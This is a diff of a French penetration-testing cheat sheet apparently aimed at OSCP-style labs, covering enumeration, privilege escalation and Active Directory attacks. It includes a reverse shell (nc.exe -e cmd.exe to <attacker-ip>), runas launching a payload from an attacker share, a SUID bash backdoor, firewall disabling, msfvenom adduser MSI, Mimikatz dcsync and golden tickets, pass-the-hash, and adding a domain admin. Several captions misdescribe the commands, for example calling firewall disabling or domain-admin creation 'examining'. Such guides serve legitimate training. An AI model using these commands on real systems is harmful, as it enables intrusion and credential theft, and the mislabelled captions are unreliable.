@@ -7,14 +7,11 @@ description: "Organiser les vérifications et la collecte des résultats."
 
 Organiser les vérifications et la collecte des résultats.
 
-
 ### Scan initial
 
 Vérifier les ports et les services de la cible autorisée.
 
-
 ### Méthodologie générale
-
 
 <p class="oscp-command-note">Netcat/Telnet : établir la connexion TCP au service «Méthodologie générale».</p>
 
@@ -23,7 +20,6 @@ nc -v [ip] [port]
 
 ```
 
-
 <p class="oscp-command-note">Tester la connexion à un port TCP.</p>
 
 ```text
@@ -31,13 +27,10 @@ telnet [ip] [port]
 
 ```
 
-
 **Paramètres et repères :**
 `site:github.com *Service version.release`  
 
-
 <p class="oscp-inline-ref"><strong>Rappel :</strong> Rechercher une vulnérabilité connue à partir de la version détectée.</p>
-
 
 #### Exemples d'identifiants et de champs à vérifier
 
@@ -52,52 +45,38 @@ telnet [ip] [port]
 `steghide` · `wireshark` · `exiftool` · `pdfcrack`  
 `zip2john` · `7z2john` · `dnSpy`  
 
-
-
-
 <p class="oscp-inline-ref"><strong>Référence GPP :</strong> <code>gpp decrypt</code> est une indication du guide, pas une commande complète vérifiée.</p>
-
 
 **Paramètres et repères :**
 `vncpwd` · `sqlite` · `.conf` · `.config`  
 `.xml`  
 
-
 #### FTP sans authentification
 
 Transférer ou récupérer des fichiers dans le laboratoire.
 
-
 **Paramètres et repères :**
 `exiftool` · `binary` · `.exe`  
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>/var/ftp/anon/&lt;directory-name-ifapplies&gt;</code></p>
-
 
 **Paramètres et repères :**
 `ftpusers` · `ftp.conf` · `proftpd.conf` · `users.xml`  
 `dotdotpwn`  
 
-
 #### SMTP
-
 
 **Paramètres et repères :**
 `nmap`  
 
-
 <p class="oscp-inline-ref"><strong>Rappel :</strong> Vérifier le service SMTP ; la note d&#x27;origine ne fournit pas une syntaxe complète.</p>
-
 
 #### DNS
 
 Interroger les enregistrements DNS et identifier les services associés.
 
-
 **Paramètres et repères :**
 `autorecon` · `nslookup`  
-
 
 <p class="oscp-command-note">Interroger les enregistrements DNS.</p>
 
@@ -106,20 +85,14 @@ dig axfr
 
 ```
 
-
 #### Kerberos
 
 Examiner les objets, les droits et les services du domaine.
 
-
 #### POP3
-
 
 **Paramètres et repères :**
 `LIST`  
-
-
-
 
 <p class="oscp-command-note">Récupérer le message POP3 correspondant au numéro indiqué, après ouverture d’une session.</p>
 
@@ -128,34 +101,26 @@ retr <number>
 
 ```
 
-
 #### RPC sans authentification
-
 
 **Paramètres et repères :**
 `enumdomusers` · `enumprinters`  
-
 
 #### SMB sans authentification
 
 Examiner les objets, les droits et les services du domaine.
 
-
 **Paramètres et repères :**
 `smbcacls`  
 
-
 #### SNMP
-
 
 **Paramètres et repères :**
 `nmap` · `snmpwalk`  
 
-
 #### LDAP sans authentification
 
 Examiner les objets, les droits et les services du domaine.
-
 
 <p class="oscp-command-note">Commande de shell locale : afficher le répertoire courant (ce n’est pas une requête LDAP).</p>
 
@@ -164,45 +129,34 @@ pwd
 
 ```
 
-
 **Paramètres et repères :**
 `Pwd` · `password` · `pass` · `Pass`  
 `ldapdomaindump`  
 
-
 #### Redis sans authentification
-
 
 **Paramètres et repères :**
 `/var/www/html/` · `module.so`  
 
-
 #### IRC
-
 
 **Paramètres et repères :**
 `hexchat`  
-
 
 ## Web
 
 Examiner les entrées et les réponses de l'application web.
 
-
 ### Scan initial
 
 Vérifier les ports et les services de la cible autorisée.
 
-
 **Version du serveur dans l'exemple :** `Apache 2.4.49`.
-
 
 ### Analyse de vulnérabilités
 
-
 **Paramètres et repères :**
 `href` · `exiftool` · `html2markdown`  
-
 
 <p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Analyse de vulnérabilités».</p>
 
@@ -211,15 +165,12 @@ curl -s http://[ip]/ | html2markdown
 
 ```
 
-
 ### Énumération des utilisateurs et recherche d’identifiants
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
-
 **Paramètres et repères :**
 `username:username` · `username:password` · `pass` · `passwd`  
-
 
 <p class="oscp-command-note">Afficher le répertoire courant.</p>
 
@@ -228,60 +179,43 @@ pwd
 
 ```
 
-
 **Paramètres et repères :**
 `user` · `usr` · `secret` · `cred`  
 `credential` · `auth` (authentification)  
-
 
 ### Identification du CMS et de sa version
 
 Examiner les entrées et les réponses de l'application web.
 
-
 **Paramètres et repères :**
 `/etc/hosts` · `phpinfo`  
 
-
-
-
 <p class="oscp-inline-ref"><strong>Valeur de configuration PHP :</strong> <code>$_SERVER[CONTEXT_DOCUMENT_ROOT]: [C:/xampp/htdocs]</code></p>
 
-
 ### Vérifications propres aux technologies détectées
-
 
 **Paramètres et repères :**
 `changelog.txt` · `endpoint_path` · `kerberoasting` · `asproasting`  
 `master.key` · `root:` · `root:password` · `/manager`  
 
-
 ### Tester le téléversement de fichiers (File Upload)
 
 Examiner les entrées et les réponses de l'application web.
 
-
 ### Logique applicative et contrôles de sécurité
-
 
 **Paramètres et repères :**
 `DoNotExist.php` · `DoNotExist.html` · `DoNotExist`  
 
-
 ### Énumération des répertoires et fichiers
-
-
-
 
 ```text
 /[boxName]
 
 ```
 
-
 **Paramètres et repères :**
 `/cgi-bin/`  
-
 
 <p class="oscp-command-note">Nmap (HTTP) : lancer les scripts NSE « http-shellshock ».</p>
 
@@ -290,12 +224,8 @@ nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,c
 
 ```
 
-
 **Paramètres et repères :**
 `/cgi-bin/` · `wfuzz` · `ffuf` · `forgot_pass.php`  
-
-
-
 
 <p class="oscp-command-note">Exemple de requête HTTP GET</p>
 
@@ -304,18 +234,14 @@ GET /forgot_pass.php?email=%0aid
 
 ```
 
-
 **Paramètres et repères :**
 `robots.txt` · `.svn` · `.DS_STORE`  
-
 
 ### Paramètres de requête et injections SQL
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
-
 ### Authentification et formulaires de connexion
-
 
 <p class="oscp-command-note">Gérer les modules Python.</p>
 
@@ -324,27 +250,20 @@ pip3 install defaultcreds-cheat-sheet
 
 ```
 
-
 **Paramètres et repères :**
 `cewl` · `version:version` · `boxname:boxname` · `admin:version`  
 `name:version`  
-
 
 ### Linux
 
 Examiner les permissions et la configuration de Linux.
 
-
 #### Principes de l’élévation de privilèges Linux
-
-
-
 
 ```bash
 sudo -l
 
 ```
-
 
 <p class="oscp-command-note">Copier les fichiers indiqués.</p>
 
@@ -353,9 +272,7 @@ cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
 
 ```
 
-
 #### Énumération générale
-
 
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Énumération générale».</p>
 
@@ -364,17 +281,13 @@ ls -la
 
 ```
 
-
 **Paramètres et repères :**
 `root:root` · `linpeas.sh` · `PwnKit`  
 
-
 <p class="oscp-inline-ref"><strong>Champs de formulaire :</strong> <code>pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret</code></p>
-
 
 **Paramètres et repères :**
 `/opt` · `/srv`  
-
 
 <p class="oscp-command-note">Rechercher des fichiers correspondant au motif «*.py».</p>
 
@@ -383,15 +296,10 @@ find / -name "*.py"
 
 ```
 
-
 #### Fichiers de configuration
-
 
 **Paramètres et repères :**
 `/root/.ssh/id_rsa`  
-
-
-
 
 ```bash
 (env || set) 2>/dev/null
@@ -399,13 +307,10 @@ echo $PATH
 
 ```
 
-
 #### Services et tâches planifiées
-
 
 **Paramètres et repères :**
 `PSPY`  
-
 
 <p class="oscp-command-note">Interroger une base de données MySQL.</p>
 
@@ -414,22 +319,17 @@ mysql -uroot -pdasdasd
 
 ```
 
-
 **Paramètres et repères :**
 `Init` · `init.d` · `systemd`  
-
 
 #### Recherche d’identifiants
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
-
 **Paramètres et repères :**
 `/etc/passwd` · `/etc/shadow` · `/etc/sudoers`  
 
-
 <p class="oscp-inline-ref"><strong>Champs de formulaire :</strong> <code>pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret</code></p>
-
 
 <p class="oscp-command-note">Chercher les occurrences de « PASSWORD » dans les fichiers accessibles. La recherche depuis / peut être longue.</p>
 
@@ -440,22 +340,17 @@ locate password | more
 
 ```
 
-
-
-
 ```powershell
 history
 cat ~/.bash_history
 
 ```
 
-
 ```bash
 history
 cat ~/.bash_history
 
 ```
-
 
 <p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>
 
@@ -463,7 +358,6 @@ cat ~/.bash_history
 strings /dev/mem -n10 | grep -i PASS
 
 ```
-
 
 <p class="oscp-command-note">Lire le fichier ~/.ssh/id_rsa et examiner son contenu.</p>
 
@@ -475,7 +369,6 @@ find / -name id_rsa 2> /dev/null
 
 ```
 
-
 <p class="oscp-command-note">Rechercher des fichiers correspondant au motif «rsyncd.conf».</p>
 
 ```bash
@@ -483,14 +376,11 @@ find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
 
 ```
 
-
 ### Windows
 
 Observer les permissions et la configuration de Windows.
 
-
 #### Énumération générale des utilisateurs
-
 
 <p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
 
@@ -505,7 +395,6 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 
 ```
 
-
 <p class="oscp-command-note">Lister les groupes locaux Windows.</p>
 
 ```powershell
@@ -514,9 +403,7 @@ net localgroup Administrators
 
 ```
 
-
 #### Énumération du système
-
 
 <p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
@@ -525,7 +412,6 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
 ```
 
-
 <p class="oscp-command-note">Interroger les informations système via WMI.</p>
 
 ```powershell
@@ -533,20 +419,17 @@ wmic qfe
 
 ```
 
-
 ```powershell
 # Interroger les paramètres système WMI
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
 
 ```
 
-
 ```powershell
 # Interroger les paramètres système WMI
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
 
 ```
-
 
 ```powershell
 # Interroger les paramètres système WMI
@@ -556,9 +439,6 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 ```
 
-
-
-
 ```bash
 # Liste des exploits du noyau https://github.com/SecWiki/windows-kernel-exploits
 # pour compiler un programme à partir de Kali
@@ -566,9 +446,7 @@ $ i586-mingw32msvc-gcc -o adduser.exe useradd.c
 
 ```
 
-
 #### Énumération réseau
-
 
 <p class="oscp-command-note">Afficher la configuration réseau Windows.</p>
 
@@ -579,7 +457,6 @@ Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 
 ```
 
-
 <p class="oscp-command-note">Afficher ou modifier les routes réseau.</p>
 
 ```powershell
@@ -588,15 +465,11 @@ Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIn
 
 ```
 
-
-
-
 ```powershell
 arp -A
 Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
 
 ```
-
 
 <p class="oscp-command-note">Examiner les ports et connexions réseau.</p>
 
@@ -605,12 +478,10 @@ netstat -ano
 
 ```
 
-
 ```powershell
 netstat -bona
 
 ```
-
 
 <p class="oscp-command-note">Afficher l'état ou les règles du pare-feu Windows.</p>
 
@@ -621,16 +492,10 @@ netsh firewall show config
 
 ```
 
-
-
-
 ```powershell
 $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
 
 ```
-
-
-
 
 ```powershell
 # Examiner les paramètres réseau Windows
@@ -638,7 +503,6 @@ netsh advfirewall set allprofiles state off
 netsh firewall set opmode disable
 
 ```
-
 
 <p class="oscp-command-note">Examiner les comptes ou ressources Windows.</p>
 
@@ -648,7 +512,6 @@ powershell Find-DomainShare -ComputerDomain domain.local
 
 ```
 
-
 <p class="oscp-command-note">Registre : interroger les clés utiles à «Énumération réseau».</p>
 
 ```powershell
@@ -657,9 +520,7 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 
 ```
 
-
 #### Configurations à risque
-
 
 <p class="oscp-command-note">Examiner les services Windows.</p>
 
@@ -679,7 +540,6 @@ exploit/windows/local/service_permissions
 
 ```
 
-
 <p class="oscp-command-note">Interroger les informations système via WMI.</p>
 
 ```powershell
@@ -688,7 +548,6 @@ wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '*'} | select PathName,DisplayName,Name
 
 ```
-
 
 <p class="oscp-command-note">Examiner les services Windows.</p>
 
@@ -713,7 +572,6 @@ net stop [service name] && net start [service name]
 
 ```
 
-
 <p class="oscp-command-note">CMD Windows : lister les chemins de services et vérifier leurs permissions avec icacls.</p>
 
 ```powershell
@@ -726,7 +584,6 @@ FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Te
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 
 ```
-
 
 <p class="oscp-command-note">Registre : interroger les clés utiles à «Configurations à risque».</p>
 
@@ -743,7 +600,6 @@ reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t RE
 
 ```
 
-
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Configurations à risque».</p>
 
 ```powershell
@@ -755,7 +611,6 @@ Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,Last
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 
 ```
-
 
 <p class="oscp-command-note">Examiner ou modifier les permissions selon «Configurations à risque».</p>
 
@@ -783,16 +638,12 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 
 ```
 
-
-
-
 ```powershell
 # Détournement du chargement de DLL via PATH (DLL Hijacking)
 # Un dossier modifiable présent dans PATH peut permettre un détournement de DLL
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\ everyone authenticated users todos %username%" && echo. )
 
 ```
-
 
 <p class="oscp-command-note">Registre : vérifier les politiques AlwaysInstallElevated.</p>
 
@@ -814,7 +665,6 @@ msfvenom -p windows/adduser USER=<COMPTE_DE_TEST> PASS='<MOT_DE_PASSE_TEST>' -f 
 msiexec.exe /i C:\Users\Public\test.msi /qn
 ```
 
-
 <p class="oscp-command-note">Examiner les tâches planifiées Windows.</p>
 
 ```powershell
@@ -830,7 +680,6 @@ Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,Task
 
 ```
 
-
 <p class="oscp-command-note">WSL : identifier le compte Linux puis modifier l'utilisateur par défaut d'une distribution.</p>
 
 ```powershell
@@ -841,11 +690,9 @@ wsl python -c 'put here your command'
 
 ```
 
-
 #### Accès aux données d’authentification
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
-
 
 <p class="oscp-command-note">PowerShell : charger ou exécuter l'outil concerné par «Accès aux données d’authentification».</p>
 
@@ -855,15 +702,11 @@ powershell.exe Start-Process cmd.exe -Verb runAs
 
 ```
 
-
-
-
 ```powershell
 # Vérifiez également avec les runas
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 
 ```
-
 
 <p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
 
@@ -873,7 +716,6 @@ findstr /si /m password *.xml *.ini *.txt
 
 ```
 
-
 <p class="oscp-command-note">Windows : examiner cmdkey puis tester runas /savecred avec un compte enregistré et autorisé.</p>
 
 ```powershell
@@ -882,7 +724,6 @@ cmdkey /list
 runas /savecred /user:WORKGROUP\Administrator "\\attacker-ip\SHARE\welcome.exe"
 
 ```
-
 
 <p class="oscp-command-note">Registre : contrôler les paramètres de connexion Winlogon.</p>
 
@@ -913,7 +754,6 @@ reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
 
 ```
 
-
 <p class="oscp-command-note">Chemins de fichiers à examiner pour «Accès aux données d’authentification» (pas des commandes).</p>
 
 ```powershell
@@ -924,14 +764,12 @@ c:\sysprep\sysprep.xml
 
 ```
 
-
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Accès aux données d’authentification».</p>
 
 ```powershell
 dir /s /b /p *access*.log* == *.log
 
 ```
-
 
 <p class="oscp-command-note">Rechercher des fichiers avec PowerShell.</p>
 
@@ -943,7 +781,6 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 C:\inetpub\wwwroot\web.config
 
 ```
-
 
 <p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
 
@@ -1014,7 +851,6 @@ TypedURLs #IE
 
 ```
 
-
 <p class="oscp-command-note">Afficher les interfaces, ports et routes du réseau Windows.</p>
 
 ```powershell
@@ -1028,14 +864,10 @@ cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| fi
 
 ```
 
-
-
-
 ```powershell
 c:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
 
 ```
-
 
 <p class="oscp-command-note">Charger un module PowerShell.</p>
 
@@ -1048,7 +880,6 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
 
 ```
 
-
 <p class="oscp-command-note">Lire le fichier %userprofile%\AppData\Roaming\Microsoft\Win… et examiner son contenu.</p>
 
 ```powershell
@@ -1060,17 +891,11 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 
 ```
 
-
-
-
 ```powershell
 Get-Item -path <filename> -Stream *
 Get-Content -path <filename> -Stream <keyword>
 
 ```
-
-
-
 
 ```powershell
 # Habituellement, %SYSTEMROOT% correspond à C:\Windows
@@ -1083,9 +908,6 @@ Get-Content -path <filename> -Stream <keyword>
 
 ```
 
-
-
-
 ```powershell
 # De la maison de l'utilisateur
 .aws\credentials
@@ -1096,9 +918,6 @@ AppData\Roaming\gcloud\access_tokens.db
 .azure\azureProfile.json
 
 ```
-
-
-
 
 ```powershell
 # Avant Windows Vista, rechercher dans ce répertoire
@@ -1118,28 +937,18 @@ gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 
 ```
 
-
-
-
 ```powershell
 HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
 HKCU\Software\Microsoft\Terminal Server Client\Servers\
 
 ```
 
-
-
-
 <p class="oscp-inline-ref"><strong>Élément de sécurité Windows :</strong> <code>Remote desktop credential manager</code></p>
-
-
-
 
 ```powershell
  %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 
 ```
-
 
 ```powershell
 # Vérifiez si les sotfwares récupérés sont vulnérables au chargement latéral DLL
@@ -1150,14 +959,11 @@ else { Write "Not Installed." }
 
 ```
 
-
 ## Active Directory
 
 Examiner les objets, les droits et les services du domaine.
 
-
 #### Énumération de base
-
 
 <p class="oscp-command-note">Afficher le nom de la machine.</p>
 
@@ -1167,10 +973,8 @@ ipconfig /all
 
 ```
 
-
 **Paramètres et repères :**
 `inactive/legacy`  
-
 
 <p class="oscp-command-note">Examiner les comptes utilisateurs Windows.</p>
 
@@ -1179,15 +983,12 @@ net user
 
 ```
 
-
 ```powershell
 net view \\[external_machine_ip]
 
 ```
 
-
 #### Élévation de privilèges
-
 
 <p class="oscp-command-note">Examiner les services Windows.</p>
 
@@ -1195,7 +996,6 @@ net view \\[external_machine_ip]
 sc query state= all | findstr "SERVICE_NAME"
 
 ```
-
 
 <p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
 
@@ -1206,10 +1006,8 @@ dir /s /b C:\\Users\\Public\\*.config
 
 ```
 
-
 **Paramètres et repères :**
 `impacket-secretsdump`  
-
 
 <p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>
 
@@ -1223,9 +1021,7 @@ impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
 
 ```
 
-
 #### Mouvement latéral
-
 
 <p class="oscp-command-note">Ouvrir une session distante WinRM.</p>
 
@@ -1240,7 +1036,6 @@ impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:
 impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>@<target_ip>
 
 ```
-
 
 <p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>
 
@@ -1259,13 +1054,10 @@ impacket-wmiexec <username>:<password>@<target_ip>
 
 ```
 
-
 #### Élévation de privilèges
-
 
 **Paramètres et repères :**
 `cpassword` · `SYSVOL`  
-
 
 <p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
 
@@ -1278,17 +1070,10 @@ smbclient //dc-ip/SYSVOL -U "domain\username"
 
 ```
 
-
 **Paramètres et repères :**
 `SharpHound` · `BloodHound`  
 
-
-
-
 <p class="oscp-inline-ref"><strong>Nom de requête BloodHound :</strong> <code>Shortest Path to Domain Admins</code></p>
-
-
-
 
 ```powershell
 # Collecter les relations Active Directory
@@ -1296,14 +1081,12 @@ smbclient //dc-ip/SYSVOL -U "domain\username"
 
 ```
 
-
 <p class="oscp-command-note">Examiner les tâches planifiées Windows.</p>
 
 ```powershell
 schtasks /query /fo LIST /v
 
 ```
-
 
 <p class="oscp-command-note">Vérifier les identifiants et droits visibles via WINRM avec NetExec/CrackMapExec.</p>
 
@@ -1324,18 +1107,14 @@ impacket-smbclient [user]@[ip] -hashes 00000000000000000000000000000000:[valid_n
 
 ```
 
-
 ### Contrôleur de domaine
 
 Examiner les objets, les droits et les services du domaine.
 
-
 #### Techniques visant le contrôleur de domaine
-
 
 **Paramètres et repères :**
 `mimikatz`  
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
@@ -1344,17 +1123,13 @@ mimikatz # lsadump::dcsync /domain:<domain> /user:<target_user>
 
 ```
 
-
 **Paramètres et repères :**
 `NTDS.dit`  
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\NTDS\</code></p>
-
 
 **Paramètres et repères :**
 `NTDS.dit` · `SYSTEM` · `impacket-secretsdump`  
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
@@ -1363,26 +1138,19 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 
 ```
 
-
 #### Tickets Kerberos Golden et persistance
-
-
-
 
 ```powershell
 kerberos::golden /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /user:Administrator
 
 ```
 
-
 #### Données d’authentification LSASS
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
-
 **Paramètres et repères :**
 `LSASS` · `Mimikatz`  
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
@@ -1391,12 +1159,9 @@ mimikatz # sekurlsa::logonPasswords
 
 ```
 
-
 ### Actions après accès et collecte de preuves
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\\Users\\Public</code></p>
-
 
 <p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\\Users\\[Administrator/any_user]\\Desktop</code></p>
 <p class="oscp-command-note">Afficher le nom de la machine.</p>
@@ -1406,7 +1171,6 @@ hostname && whoami && ipconfig /all && type [local/proof].txt
 
 ```
 
-
 <p class="oscp-command-note">Examiner les comptes utilisateurs Windows.</p>
 
 ```powershell
@@ -1415,9 +1179,7 @@ net group "Domain Admins" new_admin /add /domain
 
 ```
 
-
 ### Conseils complémentaires de méthodologie
-
 
 **Paramètres et repères :**
 `Invoke-Obfuscation` · `RDP` · `WinRM` · `SMBexec`  
